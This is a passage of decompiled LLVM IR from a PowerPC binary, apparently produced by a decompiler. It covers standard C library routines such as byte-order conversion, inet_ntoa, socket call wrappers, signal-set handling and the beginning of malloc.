  %v0_1000a6d8 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000a6e4 = inttoptr i32 %v0_1000a6d8 to i32*
  store i32 22, i32* %v2_1000a6e4, align 4
  br label %dec_label_pc_1000a7dc

dec_label_pc_1000a6ec:                            ; preds = %dec_label_pc_1000a6b0
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000a6f4

dec_label_pc_1000a6f4:                            ; preds = %dec_label_pc_1000a6b8, %dec_label_pc_1000a6cc, %dec_label_pc_1000a6ec
  %v1_1000a6f4 = inttoptr i32 %v0_1000a6a8 to i32*
  %v2_1000a6f4 = load i32, i32* %v1_1000a6f4, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000a6fc = add i32 %v0_1000a6a8, 4
  %v2_1000a6fc = inttoptr i32 %v1_1000a6fc to i32*
  %v3_1000a6fc = load i32, i32* %v2_1000a6fc, align 4
  store i32 %v3_1000a6fc, i32* %r9.global-to-local, align 4
  %v1_1000a700 = add i32 %v0_1000a6a8, 17
  store i32 %v1_1000a700, i32* @r4, align 4
  %v1_1000a704 = add i32 %v0_1000a6a8, 8
  %v2_1000a704 = inttoptr i32 %v1_1000a704 to i32*
  %v3_1000a704 = load i32, i32* %v2_1000a704, align 4
  %v2_1000a708 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000a708, i32* @r3, align 4
  %v2_1000a710 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000a710, i32* @r26, align 4
  store i32 %v2_1000a6f4, i32* %stack_var_-72, align 4
  store i32 268478272, i32* @lr, align 4
  %v0_1000a73c = call i32 @memcpy()
  %v0_1000a740 = load i32, i32* @r27, align 4
  %v0_1000a744 = load i32, i32* @r30, align 4
  store i32 268478292, i32* @lr, align 4
  %v3_1000a750 = call i32 @ioctl(i32 %v0_1000a740, i32 %v0_1000a744, i32 %v2_1000a710)
  store i32 %v3_1000a750, i32* @r28, align 4
  %v3_1000a754 = icmp eq i32 %v3_1000a750, 0
  br i1 %v3_1000a754, label %dec_label_pc_1000a75c, label %dec_label_pc_1000a7dc

dec_label_pc_1000a75c:                            ; preds = %dec_label_pc_1000a6f4
  %v0_1000a75c = load i32, i32* @r30, align 4
  %v3_1000a760 = icmp eq i32 %v0_1000a75c, -2144570348
  br i1 %v3_1000a760, label %dec_label_pc_1000a768, label %dec_label_pc_1000a7d8

dec_label_pc_1000a768:                            ; preds = %dec_label_pc_1000a75c
  %v0_1000a768 = call i32 @__errno_location()
  store i32 %v0_1000a768, i32* @r29, align 4
  %v0_1000a778 = load i32, i32* @r27, align 4
  %v1_1000a780 = inttoptr i32 %v0_1000a768 to i32*
  %v2_1000a780 = load i32, i32* %v1_1000a780, align 4
  store i32 %v2_1000a780, i32* @r30, align 4
  store i32 268478348, i32* @lr, align 4
  %v3_1000a788 = call i32 @ioctl(i32 %v0_1000a778, i32 1076655123, i32 %v2_1000a710)
  %v3_1000a78c = icmp eq i32 %v3_1000a788, 0
  br i1 %v3_1000a78c, label %dec_label_pc_1000a79c, label %dec_label_pc_1000a794

dec_label_pc_1000a794:                            ; preds = %dec_label_pc_1000a768
  %v0_1000a794 = load i32, i32* @r30, align 4
  %v1_1000a794 = load i32, i32* @r29, align 4
  %v2_1000a794 = inttoptr i32 %v1_1000a794 to i32*
  store i32 %v0_1000a794, i32* %v2_1000a794, align 4
  br label %dec_label_pc_1000a7dc

dec_label_pc_1000a79c:                            ; preds = %dec_label_pc_1000a768
  %v0_1000a79c = load i32, i32* @r31, align 4
  %v1_1000a79c = add i32 %v0_1000a79c, 8
  %v2_1000a79c = inttoptr i32 %v1_1000a79c to i32*
  %v3_1000a79c = load i32, i32* %v2_1000a79c, align 4
  %v1_1000a7a4 = call i32 @__asm_rlwinm(i32 %v3_1000a79c, i32 0, i32 19, i32 20)
  %v1_1000a7a8 = call i32 @__asm_rlwinm(i32 %v3_1000a704, i32 0, i32 19, i32 20)
  store i32 %v1_1000a7a8, i32* %r9.global-to-local, align 4
  %v4_1000a7ac = icmp eq i32 %v1_1000a7a4, %v1_1000a7a8
  br i1 %v4_1000a7ac, label %dec_label_pc_1000a7b4, label %dec_label_pc_1000a7c8

dec_label_pc_1000a7b4:                            ; preds = %dec_label_pc_1000a79c
  %v1_1000a7b4 = and i32 %v3_1000a79c, 768
  store i32 %v1_1000a7b4, i32* %r9.global-to-local, align 4
  %v3_1000a7b4 = icmp eq i32 %v1_1000a7b4, 0
  br i1 %v3_1000a7b4, label %dec_label_pc_1000a7d8, label %dec_label_pc_1000a7bc

dec_label_pc_1000a7bc:                            ; preds = %dec_label_pc_1000a7b4
  %v1_1000a7bc = call i32 @__asm_rlwinm(i32 %v3_1000a704, i32 0, i32 22, i32 23)
  %v0_1000a7c0 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000a7c0 = icmp eq i32 %v0_1000a7c0, %v1_1000a7bc
  br i1 %v4_1000a7c0, label %dec_label_pc_1000a7d8, label %dec_label_pc_1000a7c8

dec_label_pc_1000a7c8:                            ; preds = %dec_label_pc_1000a79c, %dec_label_pc_1000a7bc
  store i32 -1, i32* @r28, align 4
  %v1_1000a7d0 = load i32, i32* @r29, align 4
  %v2_1000a7d0 = inttoptr i32 %v1_1000a7d0 to i32*
  store i32 22, i32* %v2_1000a7d0, align 4
  br label %dec_label_pc_1000a7dc

dec_label_pc_1000a7d8:                            ; preds = %dec_label_pc_1000a75c, %dec_label_pc_1000a7bc, %dec_label_pc_1000a7b4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000a7dc

dec_label_pc_1000a7dc:                            ; preds = %dec_label_pc_1000a6f4, %dec_label_pc_1000a794, %dec_label_pc_1000a6d8, %dec_label_pc_1000a7c8, %dec_label_pc_1000a7d8
  %v0_1000a7e0 = load i32, i32* @r28, align 4
  ret i32 %v0_1000a7e0

; uselistorder directives
  uselistorder i32 %v0_1000a6a8, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 4, 5, 6, 0, 7, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a7dc, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a7d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a7c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a6f4, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000a7f4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a7f4
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000a7f8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a7f8
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000a7fc = load i32, i32* @r3, align 4
  ret i32 %v0_1000a7fc
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000a800 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a800
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000a80c = add i32 %arg2, 15
  store i32 %v1_1000a80c, i32* %r4.global-to-local, align 4
  %v2_1000a820 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a820, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a828

dec_label_pc_1000a828:                            ; preds = %dec_label_pc_1000a84c.dec_label_pc_1000a828_crit_edge, %entry
  %v0_1000a828 = phi i32 [ %v2_1000a820, %entry ], [ %v0_1000a828.pre, %dec_label_pc_1000a84c.dec_label_pc_1000a828_crit_edge ]
  %v0_1000a86c8 = phi i32 [ %v1_1000a80c, %entry ], [ %v0_1000a84c, %dec_label_pc_1000a84c.dec_label_pc_1000a828_crit_edge ]
  %v1_1000a828 = urem i32 %v0_1000a828, 256
  %v5_1000a830 = inttoptr i32 %v0_1000a86c8 to i8*
  %v6_1000a830 = call i32 @_uintmaxtostr(i8* %v5_1000a830, i32 0, i32 %v1_1000a828, i32 -10, i32 0)
  %v0_1000a834 = load i32, i32* @r30, align 4
  %v3_1000a834 = icmp eq i32 %v0_1000a834, 0
  %v0_1000a838 = load i32, i32* @r31, align 4
  %v1_1000a838 = udiv i32 %v0_1000a838, 256
  store i32 %v1_1000a838, i32* %r31.global-to-local, align 4
  %v1_1000a83c = add i32 %v6_1000a830, -1
  store i32 %v1_1000a83c, i32* %r4.global-to-local, align 4
  br i1 %v3_1000a834, label %dec_label_pc_1000a84c, label %dec_label_pc_1000a844

dec_label_pc_1000a844:                            ; preds = %dec_label_pc_1000a828
  %v3_1000a848 = inttoptr i32 %v0_1000a834 to i8*
  store i8 46, i8* %v3_1000a848, align 1
  %v0_1000a84c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a84c

dec_label_pc_1000a84c:                            ; preds = %dec_label_pc_1000a828, %dec_label_pc_1000a844
  %v0_1000a84c = phi i32 [ %v1_1000a83c, %dec_label_pc_1000a828 ], [ %v0_1000a84c.pre, %dec_label_pc_1000a844 ]
  %v0_1000a850.pre = load i32, i32* @r29, align 4
  %v1_1000a860 = add i32 %v0_1000a850.pre, 1
  store i32 %v1_1000a860, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000a850.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000a84c.dec_label_pc_1000a828_crit_edge, label %dec_label_pc_1000a868

dec_label_pc_1000a84c.dec_label_pc_1000a828_crit_edge: ; preds = %dec_label_pc_1000a84c
  %v0_1000a828.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a828

dec_label_pc_1000a868:                            ; preds = %dec_label_pc_1000a84c
  %v1_1000a86c = add i32 %v0_1000a84c, 1
  ret i32 %v1_1000a86c

; uselistorder directives
  uselistorder i32 %v0_1000a850.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a84c, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000a894 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a894, i32* %stack_var_-8, align 4
  store i32 268478628, i32* @lr, align 4
  %v3_1000a8a0 = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_10025e20.200 to i32))
  ret i32 %v3_1000a8a0
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000a8bc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000a8bc, i32* @r4, align 4
  store i32 268478664, i32* @lr, align 4
  %v1_1000a8c4 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000a8c4 = call i32 @inet_aton(i8* %v1_1000a8c4)
  %v3_1000a8c8 = icmp eq i32 %v2_1000a8c4, 0
  br i1 %v3_1000a8c8, label %dec_label_pc_1000a8d8, label %dec_label_pc_1000a8d4

dec_label_pc_1000a8d4:                            ; preds = %entry
  %v3_1000a8d4 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000a8d8

dec_label_pc_1000a8d8:                            ; preds = %entry, %dec_label_pc_1000a8d4
  %v0_1000a8e4 = phi i32 [ -1, %entry ], [ %v3_1000a8d4, %dec_label_pc_1000a8d4 ]
  ret i32 %v0_1000a8e4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a8d8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000a8fc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268478732, i32* @lr, align 4
  %v2_1000a908 = call i32 @__socketcall(i32 3, i32 %v2_1000a8fc)
  ret i32 %v2_1000a908

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000a930 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268478784, i32* @lr, align 4
  %v2_1000a93c = call i32 @__socketcall(i32 6, i32 %v2_1000a930)
  ret i32 %v2_1000a93c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000a964 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268478844, i32* @lr, align 4
  %v2_1000a978 = call i32 @__socketcall(i32 15, i32 %v2_1000a964)
  ret i32 %v2_1000a978

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 15, { 0, 2, 3, 1 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000a9a0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268478900, i32* @lr, align 4
  %v2_1000a9b0 = call i32 @__socketcall(i32 10, i32 %v2_1000a9a0)
  ret i32 %v2_1000a9b0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000a9d8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268478956, i32* @lr, align 4
  %v2_1000a9e8 = call i32 @__socketcall(i32 9, i32 %v2_1000a9d8)
  ret i32 %v2_1000a9e8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000aa10 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479020, i32* @lr, align 4
  %v2_1000aa28 = call i32 @__socketcall(i32 11, i32 %v2_1000aa10)
  ret i32 %v2_1000aa28

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000aa50 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479080, i32* @lr, align 4
  %v2_1000aa64 = call i32 @__socketcall(i32 14, i32 %v2_1000aa50)
  ret i32 %v2_1000aa64

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000aa8c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479132, i32* @lr, align 4
  %v2_1000aa98 = call i32 @__socketcall(i32 1, i32 %v2_1000aa8c)
  ret i32 %v2_1000aa98

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 2, 1, 0, 3, 5, 7, 4, 6 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000aadc, label %dec_label_pc_1000aac8

dec_label_pc_1000aac8:                            ; preds = %entry
  %v0_1000aac8 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000aad4 = inttoptr i32 %v0_1000aac8 to i32*
  store i32 22, i32* %v2_1000aad4, align 4
  %v0_1000aae8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aae4

dec_label_pc_1000aadc:                            ; preds = %entry
  %v0_1000aadc = call i32 @__sigaddset()
  store i32 %v0_1000aadc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aae4

dec_label_pc_1000aae4:                            ; preds = %dec_label_pc_1000aac8, %dec_label_pc_1000aadc
  %v0_1000aae8 = phi i32 [ %v0_1000aae8.pre, %dec_label_pc_1000aac8 ], [ %v0_1000aadc, %dec_label_pc_1000aadc ]
  ret i32 %v0_1000aae8

; uselistorder directives
  uselistorder label %dec_label_pc_1000aae4, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268479248, i32* @lr, align 4
  %v3_1000ab0c = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000ab24 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ab24, label %dec_label_pc_1000ab50, label %dec_label_pc_1000ab40

dec_label_pc_1000ab40:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000ab50, label %dec_label_pc_1000ab48

dec_label_pc_1000ab48:                            ; preds = %dec_label_pc_1000ab40
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000ab80.lr.ph, label %dec_label_pc_1000ab50

dec_label_pc_1000ab50:                            ; preds = %dec_label_pc_1000ab48, %dec_label_pc_1000ab40, %entry
  %v0_1000ab50 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ab5c = inttoptr i32 %v0_1000ab50 to i32*
  store i32 22, i32* %v2_1000ab5c, align 4
  %v0_1000abf0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000abec

dec_label_pc_1000ab80.lr.ph:                      ; preds = %dec_label_pc_1000ab48
  %v2_1000ab70 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000ab70, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000ab8022 = add i32 %v2_1000ab70, 128
  %v3_1000ab8023 = inttoptr i32 %v2_1000ab8022 to i32*
  store i32 0, i32* %v3_1000ab8023, align 4
  %v0_1000ab8424 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ab8425 = add i32 %v0_1000ab8424, -1
  store i32 %v1_1000ab8425, i32* %r11.global-to-local, align 4
  %v1_1000ab8826 = mul i32 %v1_1000ab8425, 4
  %v1_1000ab8c27 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ab8c28 = add i32 %v1_1000ab8c27, %v1_1000ab8826
  store i32 %v2_1000ab8c28, i32* %r9.global-to-local, align 4
  %v0_1000ab9029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ab9030 = add i32 %v0_1000ab9029, -1
  store i32 %v1_1000ab9030, i32* %ctr.global-to-local, align 4
  %v2_1000ab9031 = icmp eq i32 %v1_1000ab9030, 0
  br i1 %v2_1000ab9031, label %dec_label_pc_1000ab94, label %dec_label_pc_1000ab80.dec_label_pc_1000ab80_crit_edge

dec_label_pc_1000ab80.dec_label_pc_1000ab80_crit_edge: ; preds = %dec_label_pc_1000ab80.lr.ph, %dec_label_pc_1000ab80.dec_label_pc_1000ab80_crit_edge
  %v2_1000ab8c32 = phi i32 [ %v2_1000ab8c, %dec_label_pc_1000ab80.dec_label_pc_1000ab80_crit_edge ], [ %v2_1000ab8c28, %dec_label_pc_1000ab80.lr.ph ]
  %v0_1000ab80.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ab80 = add i32 %v2_1000ab8c32, 4
  %v3_1000ab80 = inttoptr i32 %v2_1000ab80 to i32*
  store i32 %v0_1000ab80.pre, i32* %v3_1000ab80, align 4
  %v0_1000ab84 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ab84 = add i32 %v0_1000ab84, -1
  store i32 %v1_1000ab84, i32* %r11.global-to-local, align 4
  %v1_1000ab88 = mul i32 %v1_1000ab84, 4
  %v1_1000ab8c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ab8c = add i32 %v1_1000ab8c, %v1_1000ab88
  store i32 %v2_1000ab8c, i32* %r9.global-to-local, align 4
  %v0_1000ab90 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ab90 = add i32 %v0_1000ab90, -1
  store i32 %v1_1000ab90, i32* %ctr.global-to-local, align 4
  %v2_1000ab90 = icmp eq i32 %v1_1000ab90, 0
  br i1 %v2_1000ab90, label %dec_label_pc_1000ab94, label %dec_label_pc_1000ab80.dec_label_pc_1000ab80_crit_edge

dec_label_pc_1000ab94:                            ; preds = %dec_label_pc_1000ab80.dec_label_pc_1000ab80_crit_edge, %dec_label_pc_1000ab80.lr.ph
  %v0_1000ab98.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ab94 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000ab94, i32* @r3, align 4
  store i32 %v0_1000ab98.pre, i32* @r4, align 4
  %v0_1000ab9c = call i32 @__sigaddset()
  %v1_1000aba0 = icmp slt i32 %v0_1000ab9c, 0
  br i1 %v1_1000aba0, label %dec_label_pc_1000abe8, label %dec_label_pc_1000aba8

dec_label_pc_1000aba8:                            ; preds = %dec_label_pc_1000ab94
  %v0_1000abac = load i32, i32* %r31.global-to-local, align 4
  %v2_1000abb4 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_10025e48.203 to i32), i32 %v0_1000abac)
  %v2_1000abc0 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268479448, i32* @lr, align 4
  %v4_1000abd4 = call i32 @__libc_sigaction(i32 %v0_1000abac, i32* nonnull %stack_var_-296, i32 %v2_1000abc0)
  %v1_1000abd8 = icmp slt i32 %v4_1000abd4, 0
  br i1 %v1_1000abd8, label %dec_label_pc_1000abe8, label %dec_label_pc_1000abe0

dec_label_pc_1000abe0:                            ; preds = %dec_label_pc_1000aba8
  %v3_1000abe0 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000abe0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000abec

dec_label_pc_1000abe8:                            ; preds = %dec_label_pc_1000aba8, %dec_label_pc_1000ab94
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000abec

dec_label_pc_1000abec:                            ; preds = %dec_label_pc_1000abe0, %dec_label_pc_1000ab50, %dec_label_pc_1000abe8
  %v0_1000abf0 = phi i32 [ %v3_1000abe0, %dec_label_pc_1000abe0 ], [ %v0_1000abf0.pre, %dec_label_pc_1000ab50 ], [ -1, %dec_label_pc_1000abe8 ]
  ret i32 %v0_1000abf0

; uselistorder directives
  uselistorder i32 %v1_1000ab90, { 1, 0 }
  uselistorder i32 %v2_1000ab8c, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 65, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000abec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ab80.dec_label_pc_1000ab80_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000ac04 = add i32 %arg2, -1
  %v1_1000ac08 = call i32 @__asm_rlwinm(i32 %v1_1000ac04, i32 29, i32 3, i32 29)
  %v1_1000ac0c = urem i32 %v1_1000ac04, 32
  %v2_1000ac10 = add i32 %v1_1000ac08, %arg1
  %v3_1000ac10 = inttoptr i32 %v2_1000ac10 to i32*
  %v4_1000ac10 = load i32, i32* %v3_1000ac10, align 4
  %v3_1000ac18 = shl i32 1, %v1_1000ac0c
  %v2_1000ac1c = and i32 %v4_1000ac10, %v3_1000ac18
  %v2_1000ac20 = icmp ne i32 %v2_1000ac1c, 0
  %v5_1000ac24 = zext i1 %v2_1000ac20 to i32
  ret i32 %v5_1000ac24
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000ac2c = load i32, i32* @r4, align 4
  %v1_1000ac2c = add i32 %v0_1000ac2c, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000ac34 = call i32 @__asm_rlwinm(i32 %v1_1000ac2c, i32 29, i32 3, i32 29)
  %v1_1000ac38 = urem i32 %v1_1000ac2c, 32
  %v1_1000ac3c = load i32, i32* @r3, align 4
  %v2_1000ac3c = add i32 %v1_1000ac3c, %v1_1000ac34
  %v3_1000ac3c = inttoptr i32 %v2_1000ac3c to i32*
  %v4_1000ac3c = load i32, i32* %v3_1000ac3c, align 4
  %v0_1000ac40 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000ac40 = shl i32 %v0_1000ac40, %v1_1000ac38
  store i32 %v3_1000ac40, i32* %r0.global-to-local, align 4
  %v2_1000ac44 = or i32 %v3_1000ac40, %v4_1000ac3c
  store i32 %v2_1000ac44, i32* %v3_1000ac3c, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000ac54 = add i32 %arg2, -1
  %v1_1000ac5c = call i32 @__asm_rlwinm(i32 %v1_1000ac54, i32 29, i32 3, i32 29)
  %v1_1000ac60 = urem i32 %v1_1000ac54, 32
  %v2_1000ac64 = add i32 %v1_1000ac5c, %arg1
  %v3_1000ac64 = inttoptr i32 %v2_1000ac64 to i32*
  %v4_1000ac64 = load i32, i32* %v3_1000ac64, align 4
  %v3_1000ac68 = shl i32 -2, %v1_1000ac60
  %v4_1000ac68 = sub nsw i32 32, %v1_1000ac60
  %v5_1000ac68 = lshr i32 -2, %v4_1000ac68
  %v6_1000ac68 = or i32 %v5_1000ac68, %v3_1000ac68
  %v2_1000ac6c = and i32 %v6_1000ac68, %v4_1000ac64
  store i32 %v2_1000ac6c, i32* %v3_1000ac64, align 4
  ret i32 0
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000ac7c = load i32, i32* %r3.global-to-local, align 4
  %v3_1000ac7c = icmp eq i32 %v0_1000ac7c, 0
  br i1 %v3_1000ac7c, label %dec_label_pc_1000ac94, label %dec_label_pc_1000ac98

dec_label_pc_1000ac94:                            ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ac98

dec_label_pc_1000ac98:                            ; preds = %entry, %dec_label_pc_1000ac94
  %v0_1000aca8 = phi i32 [ 1, %dec_label_pc_1000ac94 ], [ %v0_1000ac7c, %entry ]
  %v3_1000ac9c = icmp ugt i32 %v0_1000aca8, -8
  br i1 %v3_1000ac9c, label %dec_label_pc_1000adac, label %dec_label_pc_1000aca4

dec_label_pc_1000aca4:                            ; preds = %dec_label_pc_1000ac98
  %v1_1000aca8 = add i32 %v0_1000aca8, 4
  store i32 ptrtoint (i32* @global_var_10025e30.204 to i32), i32* @r29, align 4
  store i32 %v1_1000aca8, i32* %stack_var_-40, align 4
  store i32 ptrtoint (i32* @global_var_10025e30.204 to i32), i32* %r3.global-to-local, align 4
  %v0_1000acb8 = call i32 @__pthread_return_0()
  %v2_1000acc0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32 -624), i32* %r3.global-to-local, align 4
  %v3_1000acc8 = call i32 @__heap_alloc(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32 -624) to i32*), i32 %v2_1000acc0)
  store i32 %v3_1000acc8, i32* %r31.global-to-local, align 4
  %v0_1000acd0 = load i32, i32* @r29, align 4
  store i32 %v0_1000acd0, i32* %r3.global-to-local, align 4
  %v0_1000acd4 = call i32 @__pthread_return_0()
